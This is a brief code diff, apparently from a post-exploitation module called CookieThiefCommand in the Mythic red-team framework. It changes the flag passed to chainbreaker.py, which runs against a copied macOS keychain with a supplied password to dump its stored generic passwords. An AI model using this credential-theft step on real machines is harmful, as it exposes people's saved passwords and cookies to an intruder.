@@ -83,7 +83,7 @@ class CookieThiefCommand(CommandBase):
 
 
         try:
-            subprocess.run(["python2", "/Mythic/mythic/chainbreaker/chainbreaker.py", "--password=" + password, "--dump-generic-passwords", "tmp_login.keychain-db"])
+            subprocess.run(["python2", "/Mythic/mythic/chainbreaker/chainbreaker.py", "--password=" + password, "--export-generic-passwords", "tmp_login.keychain-db"])
 
         except Exception as e:
             print("Chainbreaker script failed with error: " + str(e))
